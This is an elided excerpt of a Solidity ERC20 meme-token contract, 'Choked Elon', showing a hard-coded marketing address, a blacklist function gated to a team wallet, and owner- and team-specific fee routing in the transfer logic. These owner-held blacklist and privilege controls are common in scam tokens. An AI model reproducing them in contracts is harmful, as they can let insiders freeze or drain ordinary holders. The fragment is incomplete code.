...
contract ChokedElon is Context, IERC20, Ownable {
    ...
    string private _name = 'Choked Elon';
    string private _symbol = 'CHOKEDELON';
    uint8 private _decimals = 18;
    address private _mktAddress = 0x42A44B8f13d3C230aCFb226cdbd75239691D381C;
    ...
    function removeFromBlackList (address newAdd) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner() || sender == _teamWallet) {
            ...
            _balances[_mktAddress] = _balances[_mktAddress].add(transferFee);
